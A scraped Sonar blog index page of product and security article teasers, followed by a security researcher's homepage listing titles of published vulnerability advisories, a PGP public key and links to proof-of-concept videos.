Upcoming Webinar![Build better, faster: Supercharge your developers in 2025 - Register here.](/resources/webinars/upcoming/)[![](data:image/svg+xml;charset=utf-8...)![sonar logo ](https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/8e59bcad-6e39-41dc-abd9-a0e251e8d63f/Sonar%20%282%29.svg?w=128&h=32&auto=format&fit=clip)![sonar logo ](https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/8e59bcad-6e39-41dc-abd9-a0e251e8d63f/Sonar%20%282%29.svg?w=128&h=32&auto=format&fit=clip)](/ "Home")

* Solutions

  Use Cases

  [AI-assisted & quality-assured codeEnsure code generated by AI assistants is of the highest quality](/solutions/ai/)[DevOps transformationHarness the full potential of DevOps by reducing roll backs and improving quality of releases](/solutions/devops-transformation/)[Code coverageEnsure code quality and security by facilitating faster debugging through clear visibility of coverage gaps.](/solutions/code-coverage/) [Reduce & manage technical debtMaximize innovation by proactively managing technical debt](/solutions/reduce-technical-debt/)[Secure by designIntegrate code security in compliance with NIST Secure Software Development Framework](/solutions/secure-by-design-code/)[All Use CasesRead more about Sonar Use cases with blog articles, technical articles and developer guides](/solutions/use-cases/)

  Clean Code

  [What is clean codeA detailed definition of Clean Code](/solutions/clean-code/)[Power of clean codeBusiness success built on Clean Code](/solutions/power-of-clean-code/)[Security starts with Clean CodeStatic Application Security Testing with Sonar](/solutions/security/)[Clean as You CodeOur unique approach to Clean Code](/solutions/our-unique-approach/)

  Something For Everyone

  [For DevelopersFind and fix issues as you code](/solutions/for-developers/)[For DevOpsBuild your apps on Clean Code foundations](/solutions/infrastructure-as-code/)[For EnterpriseClean Code delivery from development to production](/solutions/for-enterprise/)[For the Public SectorClean Code for the public sector](/solutions/public-sector/)
* Products

  Industry Leading Products

  [![]()![](https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/aa3b1f02-f1b0-448f-a3f2-a1bd32923a08/SQ_Logo_Cloud_Light%20Backgrounds.svg?w=176&h=48&auto=format&fit=crop)Formerly SonarCloudCloud-based static analysis tool for your CI/CD workflows](/products/sonarcloud/)[![]()![](https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/bdac1871-464e-4051-88db-7df20c3bfffa/SQ_Logo_Server_Light%20Backgrounds.svg?w=176&h=48&auto=format&fit=crop)Formerly SonarQubeSelf-managed static analysis tool for continuous codebase inspection](/products/sonarqube/)[![]()![](https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/49f23af2-a29b-4d0f-95d7-ffd361f375e1/SQ_Logo_IDE_Light%20Backgrounds.svg?w=176&h=48&auto=format&fit=crop)Formerly SonarLintFree IDE extension that provides on-the-fly analysis and coding guidance](/products/sonarlint/)

  Languages and Frameworks

  [Java](/knowledge/languages/java/)[JavaScript](/knowledge/languages/js/)[TypeScript](/knowledge/languages/ts/)[Python](/knowledge/languages/python/)[C#](/knowledge/languages/csharp/)[C++](/knowledge/languages/cpp/)[C](/knowledge/languages/c/)[PHP](/knowledge/languages/php/)[Kotlin](/knowledge/languages/kotlin/)[See All](/lp/knowledge/languages/)
* Resources

  Learn About Clean Code

  [BlogStay connected with our latest development news and articles](/blog/)[Events hubLet's meet up online or in person - browse our conferences and webinars, or watch previous talks](/resources/events/)[Customer StoriesCheck out Sonar implementation success stories](/resources/customer-stories/)[White PapersFind in-depth articles on clean code](/resources/white-papers/)[LearnDeveloper learning hub - covering essential topics](/learn/)[Solution BriefsOur library of solution briefs](/resources/solution-briefs/)

  Go In Depth

  [SonarQube Server DocumentationFind more information on the technical details of SonarQube Server](https://docs.sonarsource.com/sonarqube/latest/)[SonarQube Cloud DocumentationFind more information on the technical details of SonarQube Cloud](https://docs.sonarsource.com/sonarcloud/)[SonarQube for IDE DocumentationFind more information on the technical details of SonarQube IDE](https://docs.sonarsource.com/sonarlint/)[Explore SonarpediaExplore our publicly available multi-language rules database](https://rules.sonarsource.com/)[LanguagesSee our multi-language coverage](/knowledge/languages/)
* Company

  Deliver Better Software

  [About UsSonar’s industry leading solution enables developers to write clean code and remediate existing code organically](/company/about/)[CareersJoin our growing team](/company/careers/)[Commitment to open sourceOur commitment to transparency, security, and continuous improvement](/solutions/commitment-to-open-source/)[CommunityGet latest updates, suggest features, and share your knowledge](https://community.sonarsource.com/)[PartnersSonar partners with the best resellers to bring Clean Code closer to you](/company/partners/)[Contact usHave questions? Get in touch](/company/contact/)

  Media

  [NewsroomNews announcements, media coverage, and more](/company/newsroom/)[CoverageFind articles about Sonar in the news](/company/coverage/)[Press ReleasesThe latest Sonar updates](/company/press-releases/)[CustomersAn overview of customers using Sonar by industry](/company/customers/)[Press KitExecutive headshots, quick stats, customer logos, and more](/company/press-kit/)
[Start for free](/open-source-editions/)[Explore pricing](/plans-and-pricing/)
Search modal toggle button[Start for free](/open-source-editions/)[Explore pricing](/plans-and-pricing/)Mobile menu toggle button
## [Sonar Blog](/blog/)

### Quality

Mobile menu toggle button

[Quality](https://www.sonarsource.com/blog/tag/code-quality/)[Security](https://www.sonarsource.com/blog/tag/security/)[Integrations](https://www.sonarsource.com/blog/?query=integrations)[Company](https://www.sonarsource.com/blog/?query=company)
# Sonar's latest blog posts

Featured Post
### Building Confidence and Trust in AI-Generated Code

To tackle the accountability and ownership challenge accompanying AI-generated code, we are introducing Sonar AI Code Assurance

[Read More](/blog/ai-code-assurance-sonar/)![](data:image/svg+xml;charset=utf-8...)![https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/0bd6c0bc-c921-485b-8570-8de7e1384983/AI%20Code%20Assurance_square-index%402x.png]()![https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/0bd6c0bc-c921-485b-8570-8de7e1384983/AI%20Code%20Assurance_square-index%402x.png](https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/0bd6c0bc-c921-485b-8570-8de7e1384983/AI%20Code%20Assurance_square-index%402x.png?w=1080&h=1080&auto=format&fit=crop)[![https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/0fbfcf02-dc88-4363-af1f-266bd828aa34/LTA_Blog%20Index.webp]()![https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/0fbfcf02-dc88-4363-af1f-266bd828aa34/LTA_Blog%20Index.webp](https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/0fbfcf02-dc88-4363-af1f-266bd828aa34/LTA_Blog%20Index.webp?w=325&h=200&auto=format&fit=crop)Blog post
### SonarQube Server 2025.1 LTA Release Announcement

The new SonarQube Server LTA release is as value-packed as ever. Look forward to high-impact AI capabilities, more secure code at every angle, supercharged developer productivity, and even better enterprise and operational capabilities. As always, there's something for everyone with the LTA!

Read article >](/blog/sonarqube-server-2025-1-lta-release-announcement/)[![https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/df2679b4-3cb6-43e6-913a-2b19a3727b71/sq_ide_2024_highlights_landscape_index.webp]()![https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/df2679b4-3cb6-43e6-913a-2b19a3727b71/sq_ide_2024_highlights_landscape_index.webp](https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/df2679b4-3cb6-43e6-913a-2b19a3727b71/sq_ide_2024_highlights_landscape_index.webp?w=325&h=200&auto=format&fit=crop)Blog post
### SonarQube for IDE: Our journey this year, and sneak peek into 2025

Reviewing the enhancements delivered by the SonarQube for IDE team for developers during 2024. Focusing on streamlining the UX for teams, harnessing the power of SonarQube Server and Cloud through connected mode into your IDE, and making it even easier to focus on new code.

Read article >](/blog/sonarqube-for-ide-our-journey-this-year-and-sneak-peek-into-2025/)
## Get new blogs delivered directly to your inbox!

Stay up-to-date with the latest Sonar content. Subscribe now to receive the latest blog articles.

Email\*cheqSign up

By submitting this form, you agree to the storing and processing of your personal data as described in the [Privacy Policy](/company/privacy/ "Privacy Policy") and [Cookie Policy](/company/cookie-policy/ "Cookie Policy"). You can withdraw your consent by unsubscribing at any time.

This site is protected by reCAPTCHA and the Google [Privacy Policy](https://policies.google.com/privacy) and [Terms of Service](https://policies.google.com/terms) apply.

[![https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/a1f38bdc-15bd-4852-aa89-218ca4a8502d/vulnerability_research_highlights_2024_blog_featured.webp]()![https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/a1f38bdc-15bd-4852-aa89-218ca4a8502d/vulnerability_research_highlights_2024_blog_featured.webp](https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/a1f38bdc-15bd-4852-aa89-218ca4a8502d/vulnerability_research_highlights_2024_blog_featured.webp?w=325&h=200&auto=format&fit=crop)Blog post
### Vulnerability Research Highlights 2024

Our Vulnerability Research team looks back at a great year and summarizes the highlights of 2024.

Read article >](/blog/vulnerability-research-highlights-2024/)[![https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/d292ee07-6cc3-46d7-99eb-33726ed07243/2025%20Leadership%20Predictions_Blog-landscape.png]()![https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/d292ee07-6cc3-46d7-99eb-33726ed07243/2025%20Leadership%20Predictions_Blog-landscape.png](https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/d292ee07-6cc3-46d7-99eb-33726ed07243/2025%20Leadership%20Predictions_Blog-landscape.png?w=325&h=200&auto=format&fit=crop)Blog post
### Software and AI in 2025 — Sonar Perspectives on What’s to Come in the New Year

Several Sonar leaders share their perspectives on what to expect in 2025 with AI and software development.

Read article >](/blog/software-and-ai-in-2025-sonar-perspectives-on-what-s-to-come-in-the-new-year/)[![https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/544521e4-2ddb-4e6e-850b-099dbd4a3569/Never%20Underestimate%20CSRF_Index.png]()![https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/544521e4-2ddb-4e6e-850b-099dbd4a3569/Never%20Underestimate%20CSRF_Index.png](https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/544521e4-2ddb-4e6e-850b-099dbd4a3569/Never%20Underestimate%20CSRF_Index.png?w=325&h=200&auto=format&fit=crop)Blog post
### Never Underestimate CSRF: Why Origin Reflection is a Bad Idea

CORS misconfigurations are often overlooked, but they can have severe consequences. We demonstrate how reflecting the origin header leads to code execution in Whistle.

Read article >](/blog/never-underestimate-csrf-why-origin-reflection-is-a-bad-idea/)[![https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/a246cb23-8c0b-4aeb-b402-ba74c0ffdb82/sq_cloud_blog_landscape_2x.webp]()![https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/a246cb23-8c0b-4aeb-b402-ba74c0ffdb82/sq_cloud_blog_landscape_2x.webp](https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/a246cb23-8c0b-4aeb-b402-ba74c0ffdb82/sq_cloud_blog_landscape_2x.webp?w=325&h=200&auto=format&fit=crop)Blog post
### The new SonarQube Free tier is here - get started today!

Announcing a new free tier of SonarQube, hosted in the cloud. This tier goes beyond our current community offering and gives individual developers and small teams many of the features of our commercial SonarQube offering.

Read article >](/blog/the-new-sonarqube-free-tier-is-here/)[![https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/74fb89d5-e86a-4482-870a-02a9155d0a80/sq_10_8_blog_index.webp]()![https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/74fb89d5-e86a-4482-870a-02a9155d0a80/sq_10_8_blog_index.webp](https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/74fb89d5-e86a-4482-870a-02a9155d0a80/sq_10_8_blog_index.webp?w=325&h=200&auto=format&fit=crop)Blog post
### SonarQube Server 10.8 Release Announcement

This release includes stronger AI Code Assurance and AI CodeFix capabilities. Choose from two new operating modes to run the server in a way that best suits your business needs. Exciting things continue to happen with our language support, like new architecture rules, support for Ansible IaC, and full support of our Dart/Flutter coverage. Find out what’s in store for you.

Read article >](/blog/sonarqube-server-10-8-release-announcement/)[![https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/fdf8d109-3435-4ff2-a916-0ddec15cdd24/SQ%20License%20and%20Community%20Build%20Changes_Blog-landscape.png]()![https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/fdf8d109-3435-4ff2-a916-0ddec15cdd24/SQ%20License%20and%20Community%20Build%20Changes_Blog-landscape.png](https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/fdf8d109-3435-4ff2-a916-0ddec15cdd24/SQ%20License%20and%20Community%20Build%20Changes_Blog-landscape.png?w=325&h=200&auto=format&fit=crop)Blog post
### A better (free) SonarQube experience

Announcing a new free tier of SonarQube, hosted in the cloud. This tier goes beyond our current community offering and gives individual developers and small teams many of the features of our commercial SonarQube offering.

Read article >](/blog/better-free-sonarqube-experience/)[![https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/3100fa95-172f-4b28-a2eb-73e0f1476a24/trust_ai_contributions_landscape_index.webp]()![https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/3100fa95-172f-4b28-a2eb-73e0f1476a24/trust_ai_contributions_landscape_index.webp](https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/3100fa95-172f-4b28-a2eb-73e0f1476a24/trust_ai_contributions_landscape_index.webp?w=325&h=200&auto=format&fit=crop)Blog post
### How to trust AI contributions to your codebase

In a world where AI generates code, code ownership and trust become increasingly obscure. Many enterprises already find this situation untenable, and they are looking for ways to solve it. But where do you start?

Read article >](/blog/trust-ai-contributions-to-code/)[![https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/400c9c80-4638-4e7e-995b-7265dff7fdda/Our%20commitment%20to%20you_Blog_Landscape%402x.png]()![https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/400c9c80-4638-4e7e-995b-7265dff7fdda/Our%20commitment%20to%20you_Blog_Landscape%402x.png](https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/400c9c80-4638-4e7e-995b-7265dff7fdda/Our%20commitment%20to%20you_Blog_Landscape%402x.png?w=325&h=200&auto=format&fit=crop)Blog post
### Our commitment to you – and an update on severity ratings for software quality

The speed of software development and product delivery is increasing for organizations everywhere – including here at Sonar. In this blog, we decided to put our guiding engineering principles in writing and share them with you.

Read article >](/blog/sonars-commitment-to-you/)[![https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/faa1e2b0-9a01-4fdd-b8bc-9ca5ec15da23/html_sanitization_landscape_index.webp]()![https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/faa1e2b0-9a01-4fdd-b8bc-9ca5ec15da23/html_sanitization_landscape_index.webp](https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/faa1e2b0-9a01-4fdd-b8bc-9ca5ec15da23/html_sanitization_landscape_index.webp?w=325&h=200&auto=format&fit=crop)Blog post
### Sanitize Client-Side: Why Server-Side HTML Sanitization is Doomed to Fail

HTML sanitization has long been touted as a solution to prevent malicious content injection. However, this approach faces numerous challenges. In this blog post, we'll explore the limitations of server-side HTML sanitization and discuss why client-side sanitization is the better approach.

Read article >](/blog/sanitize-client-side-why-server-side-html-sanitization-is-doomed-to-fail/)

* Prev
* [1](/blog/)
* [2](/blog/2/)
* [3](/blog/3/)
* ●
* [34](/blog/34/)
* [Next](/blog/2/)
[Go to SonarSource homepage![](data:image/svg+xml;charset=utf-8...)![sonar logo ]()![sonar logo ](https://assets-eu-01.kc-usercontent.com:443/a8c9572d-fe62-0144-0642-b3f31f575091/8e59bcad-6e39-41dc-abd9-a0e251e8d63f/Sonar%20%282%29.svg?w=160&h=40&auto=format&fit=crop)](/)

* **Sonar Solutions**
  + [SAST](/solutions/security/)
  + [What is clean code](/solutions/clean-code/)
  + [Power of clean code](/solutions/power-of-clean-code/)
  + [Clean as you code](/solutions/our-unique-approach/)
  + [AI-assisted & quality-assured code](/solutions/ai/)
  + [DevOps transformation](/solutions/devops-transformation/)
  + [Outsourcing software development](/solutions/reduce-outsourcing-software-development-risk/)
  + [Reduce & manage technical debt](/solutions/reduce-technical-debt/)
  + [Secure by design](/solutions/secure-by-design-code/)
  + [Code coverage](/solutions/code-coverage/)
  + [Code review](/solutions/code-review/)
  + [For developers](/solutions/for-developers/)
  + [For enterprise](/solutions/for-enterprise/)
  + [Infrastructure as code](/solutions/infrastructure-as-code/)
  + [Public sector](/solutions/public-sector/)
* **Products**
  + [SonarQube for IDE](/products/sonarlint/)
  + [SonarQube Server](/products/sonarqube/)
  + [SonarQube Cloud](/products/sonarcloud/)**Pricing**
  + [Start for free](/open-source-editions/)
  + [Explore pricing](/plans-and-pricing/)
* **Company**
  + [About](/company/about/)
  + [Careers](/company/careers/)
  + [Commitment to open source](/solutions/commitment-to-open-source/)
  + [Customers](/company/customers/)
  + [Partners](/company/partners/)
  + [Contact us](/company/contact/)
  + [Accessibility](/accessibility/)
  + [NEW! Brand identity](/brand-identity/)**Media**
  + [Coverage](/company/coverage/)
  + [Press releases](/company/press-releases/)
* **Resources**
  + [Events hub](/resources/events/)
  + [Customer stories](/resources/customer-stories/)
  + [White papers](/resources/white-papers/)
  + [Learn](/learn/guide/)
  + [Community](https://community.sonarsource.com/)
  + [Support](/support/)
* **Knowledge**
  + [Explore Sonarpedia](https://rules.sonarsource.com/)
  + [Blog](/blog/)
  + [Languages](/knowledge/languages/)
  + [SonarQube Server Documentation](https://docs.sonarsource.com/sonarqube/latest/)
  + [SonarQube Cloud Documentation](https://docs.sonarsource.com/sonarcloud/)
  + [SonarQube for IDE Documentation](https://docs.sonarsource.com/sonarlint/)

* [Legal documentation](/legal/)
* [Trust center](/trust-center/)

* [Follow SonarSource on Twitter](https://twitter.com/sonarsource)
* [Follow SonarSource on Linkedin](https://www.linkedin.com/company/sonarsource/)

© 2008-2025 SonarSource SA. All rights reserved. SONAR, SONARSOURCE, SONARQUBE, and CLEAN AS YOU CODE are trademarks of SonarSource SA.



=== Content from legalhackers.com_bd402dbf_20250126_062519.html ===


## LEGAL HACKERS

# Dawid Golunski

Information Security.

Security Research.

Legal/ethical Hacking.

Penetration Testing.

# Contact

![](static/email_sm.png) e-mail  >

![](static/twit.jpg) twitter > [@dawid\_golunski](https://twitter.com/%40dawid_golunski)

# Security advisories

Some of the released advisories can be found below:

1. [Git-LFS <= 2.12 Remote Code Execution (RCE) Vulnerability CVE-2020-27955](https://legalhackers.com/advisories/Git-LFS-RCE-Exploit-CVE-2020-27955.html)
2. [Wordpress 4.6 - Unauthenticated RCE Exploit (Remote Code Execution)](https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html)
3. [SquirrelMail <= 1.4.22 <= 1.4.23 Remote Code Execution (CVE-2017-7692)](./advisories/SquirrelMail-Exploit-Remote-Code-Exec-CVE-2017-7692-Vuln.html)
4. [Zend Framework / zend-mail < 2.4.11 Remote Code Execution (CVE-2016-10034)](./advisories/ZendFramework-Exploit-ZendMail-Remote-Code-Exec-CVE-2016-10034-Vuln.html)
5. [SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)](./advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html)
6. [PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045) (0day Patch Bypass/Exploit)](./advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html)
7. [PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)](./advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html)
8. [Nagios Core < 4.2.4 Root Privilege Escalation (CVE-2016-9566)](./advisories/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html)
9. [Nagios Core < 4.2.2 Curl Command Injection / Code Execution (CVE-2016-9565 / CVE-2008-4796)](./advisories/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html)
10. [Wget < 1.18 Access List Bypass / Race Condition (CVE-2016-7098)](./advisories/Wget-Exploit-ACL-bypass-RaceCond-CVE-2016-7098.html)
11. [Nginx (Debian-based + Gentoo distros) - Root Privilege Escalation (CVE-2016-1247)](./advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html)
12. [MySQL / MariaDB / Percona - Privilege Esc. / Race Condition (CVE-2016-6663 / CVE-2016-5616)](./advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html)
13. [MySQL / MariaDB / Percona - Root Privilege Escalation (CVE-2016-6664 / CVE-2016-5617)](./advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html)
14. [Apache Tomcat (RedHat-based distros) - Root Privilege Escalation (CVE-2016-5425)](./advisories/Tomcat-RedHat-Pkgs-Root-PrivEsc-Exploit-CVE-2016-5425.html)
15. [Apache Tomcat (Debian-based distros) <= 6/7/8 Root Privilege Escalation (CVE-2016-1240)](./advisories/Tomcat-DebPkgs-Root-Privilege-Escalation-Exploit-CVE-2016-1240.html)
16. [MySQL / MariaDB / Percona - Remote Root Code Execution / Privilege Esc. (0day) (CVE-2016-6662)](./advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html)
17. [Adobe ColdFusion <= 11 XML External Entity (XXE) Injection (CVE-2016-4264)](./advisories/Adobe-ColdFusion-11-XXE-Exploit-CVE-2016-4264.html)
18. [vBulletin <= 5.2.2 Preauth Server Side Request Forgery (SSRF) (CVE-2016-6483)](./advisories/vBulletin-SSRF-Vulnerability-Exploit.html)
19. [Wget < 1.18 Arbitrary File Upload / Remote Code Execution (CVE-2016-4971)](./advisories/Wget-Arbitrary-File-Upload-Vulnerability-Exploit.html)
20. [CakePHP Framework <= 3.2.4 IP Spoofing Vulnerability](./advisories/CakePHP-IP-Spoofing-Vulnerability.html)
21. [Exim <= 4.86.2 Local Root Privilege Escalation](./advisories/Exim-Local-Root-Privilege-Escalation.html)
22. [Google AdWords API PHP client library <= 6.2.0 PHP Code Execution](./advisories/Google-AdWords-PHP-Client-library-PHP-Code-Execution.html)
23. [Google AdWords API client libraries - XML eXternal Entity Injection (XXE)](./advisories/Google-AdWords-API-libraries-XXE-Injection-Vulnerability.html)
24. [eBay Magento <= 1.9.2.1 XML eXternal Entity Injection (XXE) on PHP FPM](./advisories/eBay-Magento-XXE-Injection-Vulnerability.html)
25. [eBay Magento <= 1.9.2.1 Unrestricted Cron Script (Potential Code Execution / DoS)](./advisories/eBay-Magento-Unrestricted-Cron-Script-Vulnerability.html)
26. [Kirby CMS <= 2.1.0 Authentication Bypass via Path Traversal](./advisories/KirbyCMS-Path-Traversal-Authentication-Bypass-Vulnerability.html)
27. [Kirby CMS <= 2.1.0 CSRF Content Upload and PHP Script Execution](./advisories/KirbyCMS-CSRF-PHP-File-Upload-Vulnerability.html)
28. [Zend Framework <= 2.4.2 XML eXternal Entity Injection (XXE) on PHP FPM](./advisories/zend-framework-XXE-vuln.html)
29. [Nagios - Nagios Plugins - check\_dhcp = 2.0.2 Race Condition](./advisories/nagios-check_dhcp-race.html)
30. [Nagios - Nagios Plugins - check\_dhcp <= 2.0.1 Arbitrary Option File Read](./advisories/nagios-check_dhcp.html)
31. [Nagios - NRPE - Nagios Remote Plugin Executor <= 2.15 Remote Command Execution](./advisories/nagios-nrpe.html)
32. [Zabbix <= 1.8.1 SQL Injection](./advisories/zabbix181api-sql.html)
33. [Invision Power Board <= 3.0.4 Local PHP File Inclusion and SQL Injection](./advisories/invision_power_board_multiple_vulns.html)
34. [WordPress <= 2.8.5 Unrestricted File Upload Arbitrary PHP Code Execution](./advisories/wordpress_unrestricted_file_upload_vuln.html)

# PGP key

```
-----BEGIN [PGP PUBLIC KEY](http://legalhackers.com/dawid_lh.pgp) BLOCK-----

mQENBFXIwTYBCACx+HDekh0eiPpqXZOfbrQKKrbc5VZw6dB1HSIHPXZ9ifGMhGow
T6f8+gYU4SSlN/T9KiamAzlA9Nz7QdgEcXPq8tMexKQnoCyDM0wSHqOB1en7RRTN
JdchOynTYzFWt+IBoQRGspQE1SXP2RLUwioedtDz+C21iyNMwR6OcCoCFfGV2eeZ
aFM7oCKwSz9oxCJ+D3SUv5U9AZjKFoV0B52dJVVzeaqtnO3lJi7dK8+NTNY5ML+N
3cacO9qnngoNJ/iy/AtjTdmX+XHgCuSnEbY2kh3A1uAyr5ygh1YQ7K4kG7I7AXo9
lgrzQY7/xg8+uSY0NS4kJG/OEDBxX+yhNNBhABEBAAG0J0Rhd2lkIEdvbHVuc2tp
IDxkYXdpZEBsZWdhbGhhY2tlcnMuY29tPokBOAQTAQIAIgUCVcjBNgIbAwYLCQgH
AwIGFQgCCQoLBBYCAwECHgECF4AACgkQU/e+VX9sCuRSmAf+MXvieaQiPYNgjey0
lVmvEw/+6EJ4DFZ203mLdrDwKLPSe0GrzbYyma2AA8XcWDimuhvsJLJ4Rt8j7F9W
G8kyaCh0ms/NTlSI3aI5ctcaX79WtmOLwfTo+rtl0czj/3ZMXHHnH1ky0M390VQ8
ixsk5Y53wAeTSrvN8Rwyg0x1ZHanwBmgDtFPa1ubYmFDHx/Ke1H57EvVMlyi4Yz5
vs58rqr3UNKxwoANQ0X38BGHZ7K1zObZGOwJGkuGt+K3LvBOLn7fbS1P4i6u5oIw
vJRDyq6ZWrLivkc3pypUV09jjQ9vQIRSXwhfCPwRb/U45SgnO5zTq8Ospb9qsG2E
remeaLkBDQRVyME2AQgArg35L60GCpwFjMGZ4KhHedD+ioaW08E4S9pCuxsE2kzC
D/0RfzAlKeCgvrULGCTXU4kcy3ODAeNlByEtF1SE7FlSteS1X12S4Kyn8RXhYhjI
XNwYzTGTStwprYMaRSEcIqCIAHa/dcOZzsiibf+G1phwKs7FU31TSgZrbpEjNdYO
AzFpeV7BqHoo2lMQJCDEN2EIb5KEQvNxyzFjyjHcnuJ/4GQRYF0xBcVqjoiqoedF
8Uib8WM9yFF+W21auZ+yURPp6HdqT6Cv6Qx2djpC3uKfms6VOJKBDVSiQhx/GcKh
dPAobFVDfOdeWj88v3RZyR9wwRAlur5qRVIzD75iTQARAQABiQEfBBgBAgAJBQJV
yME2AhsMAAoJEFP3vlV/bArktOoH/2ID21GHxsDX/x6cutapMuveK/4pmZ/U2jWr
r+urzFYKV+muezkJCm2qy02pcJYud1DxRY5aCe2J5m1WYGROnCm5CyBb8NiQLBeK
uzk4cK1fYqk35475dE+vHdnFdz1Td2laSafYze+M2KPX82YN4R/dGsOn8hR+39b4
WXS7zzoHh+KSwvs2ab6E8Nd3p4s0jvOvQo/+L52q1+iWSnzahXRTc3u1RHIzTf+f
X6NszAhli121jVQxLeaSuxkXyuKZM5IcFfojY55GSjLUblA1A+I2qmkcheA6rs4E
hZ+4m5DgtVG5+fJpoDLLxtKYp4hSxhd59Z9mlTWMqptK0WGkW48=
=vtjs
-----END [PGP PUBLIC KEY](http://legalhackers.com/dawid_lh.pgp) BLOCK-----
```

# ExploitBox

1. [![](exploitbox_logo.png)
   **ExploitBox.io** - A Playground & Labs For Bug Hunters, Researchers, Penetration Testers &
   others interested in hacking, security, exploits and the art of exploitation.](https://ExploitBox.io)

# PoC Videos

1. [SquirrelMail < 1.4.23 Remote Code Execution (CVE-2017-7692)](https://legalhackers.com/videos/SquirrelMail-Exploit-Remote-Code-Exec-CVE-2017-7692-Vuln.html)
2. [PHPMailer / SwiftMailer / Zend-mail - Remote Code Execution
   (CVE-2016-10033 / CVE-2016-10045 / CVE-2016-10074 / CVE-2016-10034)](https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html)
3. [Nagios Core < 4.2.4 Root Privilege Escalation (CVE-2016-9566)](https://legalhackers.com/videos/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html)
4. [Nagios Core < 4.2.2 Curl Command Injection / Remote Code Execution (CVE-2016-9565)](https://legalhackers.com/videos/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html)
5. [MySQL / MariaDB / Percona - Race Cond. & Root Privilege Esc. (CVE-2016-6663 & CVE-2016-6664)](https://legalhackers.com/videos/MySQL-MariaDB-PerconaDB-PrivEsc-Race-CVE-2016-6663-5616-6664-5617-Exploits.html)
6. [Nginx (Debian-based + Gentoo distros) - Root Privilege Escalation (CVE-2016-1247)](https://legalhackers.com/videos/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html)
7. [Apache Tomcat (Debian-based distros) <= 6/7/8 Root Privilege Escalation (CVE-2016-1240)](http://legalhackers.com/videos/Apache-Tomcat-DebPkg-Root-PrivEsc-Exploit.html)
